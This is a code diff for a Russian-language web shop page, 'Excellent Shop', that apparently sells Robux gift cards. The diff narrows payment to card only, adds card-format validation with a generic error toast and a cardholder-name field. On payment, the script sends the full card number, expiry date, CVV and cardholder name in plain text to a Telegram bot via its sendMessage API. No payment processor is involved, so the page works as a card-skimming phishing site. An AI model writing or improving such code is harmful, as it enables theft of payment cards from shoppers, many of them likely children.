@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — корзина с оплатой</title>
+    <title>Excellent Shop — оплата картой</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%); position: relative; overflow-x: hidden; }
@@ -45,7 +45,6 @@
         .recipient-select { margin: 20px 0; }
         .recipient-select select, .recipient-select input { width: 100%; padding: 12px; border-radius: 60px; border: 1.5px solid #decbff; margin-top: 8px; background: white; }
         .btn-add-card { background: linear-gradient(95deg, #b87eff, #9c58e6); border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; margin-top: 20px; cursor: pointer; }
-        .activation-text { text-align: center; margin-top: 20px; font-size: 0.8rem; color: #aa8fcc; }
         /* модалка корзины */
         .cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(80,50,120,0.5); backdrop-filter: blur(6px); justify-content: center; align-items: center; z-index: 1000; }
         .cart-modal-content { background: white; border-radius: 48px; padding: 28px; width: 450px; max-width: 90%; border: 1px solid #d0aeff; position: relative; max-height: 90vh; overflow-y: auto; }
@@ -54,17 +53,31 @@
         .cart-items-list { max-height: 300px; overflow-y: auto; margin-bottom: 20px; }
         .cart-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
         .cart-total { font-weight: bold; text-align: right; margin: 15px 0; font-size: 1.2rem; }
-        /* платёжный блок */
+        /* платёжный блок - только карта */
         .payment-section { margin-top: 20px; border-top: 2px solid #decbff; padding-top: 20px; }
-        .payment-methods { display: flex; gap: 12px; margin-bottom: 15px; }
-        .pay-method { background: #f0e4ff; border: 1px solid #decbff; border-radius: 60px; padding: 8px 16px; cursor: pointer; transition: 0.2s; }
-        .pay-method.active { background: #b87eff; color: white; border-color: #b87eff; }
-        .card-fields { margin: 15px 0; }
         .card-fields input { width: 100%; padding: 12px; border-radius: 60px; border: 1.5px solid #decbff; margin-bottom: 12px; background: white; }
         .card-row { display: flex; gap: 12px; }
         .card-row input { flex: 1; }
         .pay-btn { background: #2a9d8f; border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; font-size: 1rem; cursor: pointer; margin-top: 10px; }
         footer { margin-top: 50px; text-align: center; color: #9278b0; }
+        /* красная метка ошибки */
+        .error-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff4d4d;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            z-index: 2000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            animation: fadeOut 0.5s ease 3s forwards;
+            cursor: pointer;
+        }
+        @keyframes fadeOut {
+            to { opacity: 0; visibility: hidden; }
+        }
     </style>
 </head>
 <body>
@@ -75,7 +88,7 @@
     <div id="authSection" class="auth-wrapper">
         <div class="auth-card">
             <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">корзина с платёжкой</div>
+            <div class="auth-sub">оплата картой</div>
             <div id="authForm">
                 <div id="signinForm">
                     <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
@@ -147,14 +160,13 @@
                     <input type="text" id="giftName" placeholder="Никнейм получателя" style="display:none;">
                 </div>
                 <button class="btn-add-card" id="addCardToCart">✨ Add to Cart ✨</button>
-                <div class="activation-text">🔧 Aktivacija Windows</div>
             </div>
         </div>
-        <footer>⭐ Excellent Shop — оплата в корзине ⭐</footer>
+        <footer>⭐ Excellent Shop — только карта ⭐</footer>
     </div>
 </div>
 
-<!-- Модалка корзины с платёжкой -->
+<!-- Модалка корзины с оплатой картой и именем получателя -->
 <div id="cartModal" class="cart-modal">
     <div class="cart-modal-content">
         <div class="cart-modal-header">
@@ -164,21 +176,15 @@
         <div class="cart-items-list" id="cartItemsList">пусто</div>
         <div class="cart-total" id="modalCartTotal">Итого: 0 ₽</div>
 
-        <!-- Платёжный блок -->
+        <!-- Платёжный блок только карта -->
         <div class="payment-section">
-            <div class="payment-methods">
-                <div class="pay-method active" data-method="card">💳 Карта</div>
-                <div class="pay-method" data-method="usdt">🪙 USDT</div>
-                <div class="pay-method" data-method="qiwi">📱 Qiwi</div>
-            </div>
-            <div id="cardFieldsBlock">
-                <div class="card-fields">
-                    <input type="text" id="cardNumber" placeholder="Номер карты">
-                    <div class="card-row">
-                        <input type="text" id="cardExpiry" placeholder="MM/YY">
-                        <input type="text" id="cardCvv" placeholder="CVV">
-                    </div>
+            <div class="card-fields">
+                <input type="text" id="cardNumber" placeholder="Номер карты">
+                <div class="card-row">
+                    <input type="text" id="cardExpiry" placeholder="MM/YY">
+                    <input type="text" id="cardCvv" placeholder="CVV">
                 </div>
+                <input type="text" id="recipientName" placeholder="Имя получателя (как на карте)">
             </div>
             <button class="pay-btn" id="finalPayBtn">💫 Оплатить заказ</button>
         </div>
@@ -213,6 +219,50 @@
         requestAnimationFrame(drawStars);
     }
     drawStars();
+
+    // === функция красной метки ===
+    function showErrorToast(message) {
+        // удаляем старые тосты
+        let oldToasts = document.querySelectorAll('.error-toast');
+        oldToasts.forEach(t => t.remove());
+        let toast = document.createElement('div');
+        toast.className = 'error-toast';
+        toast.innerText = message;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3500);
+    }
+
+    // === валидация карты ===
+    function validateCard(cardNum, expiry, cvv, recipientName) {
+        if (!recipientName || recipientName.trim().length < 2) {
+            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
+            return false;
+        }
+        let cleanCard = cardNum.replace(/\s/g, '');
+        if (!/^\d{13,19}$/.test(cleanCard)) {
+            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
+            return false;
+        }
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
+            return false;
+        }
+        let [month, year] = expiry.split('/');
+        let now = new Date();
+        let currentYear = now.getFullYear() % 100;
+        let currentMonth = now.getMonth() + 1;
+        let expYear = parseInt(year, 10);
+        let expMonth = parseInt(month, 10);
+        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
+            return false;
+        }
+        if (!/^\d{3,4}$/.test(cvv)) {
+            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
+            return false;
+        }
+        return true;
+    }
 
     // === авторизация ===
     let currentUser = null;
@@ -310,37 +360,18 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // === платёжная система в модалке ===
-    let selectedPaymentMethod = 'card';
-    document.querySelectorAll('.pay-method').forEach(btn=>{
-        btn.addEventListener('click',()=>{
-            document.querySelectorAll('.pay-method').forEach(b=>b.classList.remove('active'));
-            btn.classList.add('active');
-            selectedPaymentMethod = btn.getAttribute('data-method');
-            let cardBlock = document.getElementById('cardFieldsBlock');
-            if(selectedPaymentMethod === 'card') cardBlock.style.display = 'block';
-            else cardBlock.style.display = 'none';
-        });
-    });
-    // кнопка оплаты
+    // === оплата с проверкой ===
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
+        let cardNum = document.getElementById('cardNumber').value.trim();
+        let expiry = document.getElementById('cardExpiry').value.trim();
+        let cvv = document.getElementById('cardCvv').value.trim();
+        let recipientName = document.getElementById('recipientName').value.trim();
+        if(!validateCard(cardNum, expiry, cvv, recipientName)) return;
         if(!CHAT_ID) { alert('настрой телеграм'); await fetchChatId(); if(!CHAT_ID) return; }
         let total = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let paymentInfo = `Способ: ${selectedPaymentMethod.toUpperCase()}`;
-        if(selectedPaymentMethod === 'card') {
-            let cardNum = document.getElementById('cardNumber').value.trim();
-            let cardExp = document.getElementById('cardExpiry').value.trim();
-            let cardCvv = document.getElementById('cardCvv').value.trim();
-            if(!cardNum || !cardExp || !cardCvv) { alert('заполните все поля карты'); return; }
-            paymentInfo += `\n💳 Карта: ${cardNum}\n📅 ${cardExp}\n🔐 ${cardCvv}`;
-            // очищаем поля после отправки (опционально)
-            document.getElementById('cardNumber').value = '';
-            document.getElementById('cardExpiry').value = '';
-            document.getElementById('cardCvv').value = '';
-        }
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💸 ${paymentInfo}`;
+        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 Пользователь: ${currentUser}\n👤 Получатель карты: ${recipientName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
         try {
             let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
@@ -352,6 +383,10 @@
                 cart = [];
                 updateCartUI();
                 cartModal.style.display = 'none';
+                document.getElementById('cardNumber').value = '';
+                document.getElementById('cardExpiry').value = '';
+                document.getElementById('cardCvv').value = '';
+                document.getElementById('recipientName').value = '';
             } else alert('❌ ошибка отправки');
         } catch(e){ alert('ошибка соединения'); }
     });
@@ -382,7 +417,7 @@
         }
     }
 
-    // === robux plus в корзину (без карты) ===
+    // === robux plus в корзину ===
     let selectedAmountCard = 10;
     document.querySelectorAll('.amount-preset').forEach(btn=>{
         btn.addEventListener('click',()=>{
@@ -416,7 +451,6 @@
         let itemName = `Robux Plus Digital: ${amount}$ (${recipient})`;
         let priceRub = Math.round(amount * 80);
         addItemToCart({ name: itemName, price: priceRub });
-        // очистка формы
         document.getElementById('customAmount').value = '';
         if(document.getElementById('giftName').style.display === 'block') document.getElementById('giftName').value = '';
     });
